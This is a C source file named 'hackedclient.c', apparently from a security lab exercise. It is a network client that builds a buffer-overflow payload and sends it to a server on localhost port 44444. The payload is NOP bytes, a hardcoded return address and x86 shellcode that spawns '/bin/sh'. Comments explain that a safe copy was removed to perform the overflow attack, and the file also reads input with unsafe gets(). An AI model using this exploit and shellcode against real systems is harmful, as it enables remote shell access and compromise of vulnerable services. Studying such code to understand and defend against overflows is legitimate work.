/* hackedclient.c */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 44444
#define BUFFERSIZE  1024

char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;
char *gets(char *);

int main(void)  {

	unsigned char in_buf[BUFFERSIZE];
	unsigned char out_buf[BUFFERSIZE];
	char buf[80];
	unsigned int sockfd,addrlen;
	struct sockaddr_in address;
	int res,n;

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) > 0) 
                printf("Socket assigned -> %d\n", sockfd);
        else {
		perror("Cannot create Socket: ");
		return(-1);
        }

        address.sin_family = AF_INET;
        address.sin_addr.s_addr = inet_addr(SERVER_IP);
        address.sin_port = htons(SERVER_PORT);

        if (connect (sockfd, (struct sockaddr*) &address,sizeof (address)) >= 0 ) {
            printf ("Connection established with server @ %s \n",
            inet_ntoa(address.sin_addr));
        }
        else {
		perror ("\nCan't Connect!!!: ");
 		close (sockfd);
		return (-1);
        }

	if (n = recv (sockfd, in_buf, sizeof (in_buf), 0) < 0) {
		perror ("Can't read from socket:");
		close (sockfd);
		return (-1);
        }

	printf("%s\n",in_buf);
	fflush(stdout);

        /* read input from user */
	gets(buf);
	strcat(buf,"|");
	fflush(stdout);

	// out_buf = (unsigned char * ) malloc(strlen(buf)*sizeof(char));
	if (out_buf) {
		// the below statement was commented to exploit out_buf and perform an overflow attack
		/*strcpy(out_buf,buf);*/
		memset(&out_buf, 0x90, 1024);
		// the offset obtained from server side plus an offset 
		/*0xbfffed54+offset(200)*/
		// defining a variable of type long to hold the offset 
		long New_Return_address=0xbfffef54;
		// defining character pointer to point at the out_buf
		char *ptr; 
		// defining long pointer to point at the out_buf (for addresses)
		long *buffer_address_pointer;
		// both pointing at out_buf
		ptr = out_buf;
		// point at the address 
		buffer_address_pointer = (long*)(ptr);
		//place the new address in the content of the address pointer 
		for (int i = 0; i < 128; i++)
  			*(buffer_address_pointer++) = New_Return_address;
  		// find where to store shell code
		int alloc_shell = 1024-sizeof(shellcode)-1;
		// store shell code byte by byte in out_buf
		for (int i = 0; i <sizeof(shellcode) ; i++) 
      		out_buf[alloc_shell+i] = shellcode[i];
    		

		strcat(out_buf,"|");

                /* send name to server */
		if (n = send (sockfd, out_buf, strlen(out_buf), 0) < 0) {
			perror ("Cannot write to socket: ");
			close(sockfd);
			// free(out_buf);
			return (-1);
		}
	}
	else {
		perror("Cannot allocate memory: ");
		return (-1);
	}
	// free(out_buf);

        /* receive reply from server */
	if (n = recv (sockfd, in_buf, sizeof (in_buf), 0) < 0) {
		perror ("Can't read from socket:");
		close (sockfd);
		return (-1);
        }

	printf("%s",in_buf);
	fflush(stdout);		

	close(sockfd);
	return 0;
}


